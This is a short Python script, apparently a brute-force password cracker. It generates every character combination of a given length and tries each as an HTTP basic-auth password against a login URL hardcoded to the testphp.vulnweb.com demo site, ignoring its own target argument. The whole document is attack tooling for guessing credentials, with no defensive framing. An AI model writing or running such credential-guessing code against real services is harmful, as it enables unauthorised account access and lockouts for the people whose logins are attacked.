import requests
import itertools

def validate_http_basic_auth(target, username, password):
    url = f"http://testphp.vulnweb.com/login.php"
    try:
        response = requests.get(url, auth=(username, password))
        return response.status_code == 200
    except requests.RequestException:
        return False

def brute_force(password_list, target, username, validate_function):
    for password in password_list:
        if validate_function(target, username, password):
            return password
    return None

def generate_passwords(charset, length):
    return [''.join(candidate) for candidate in itertools.product(charset, repeat=length)]
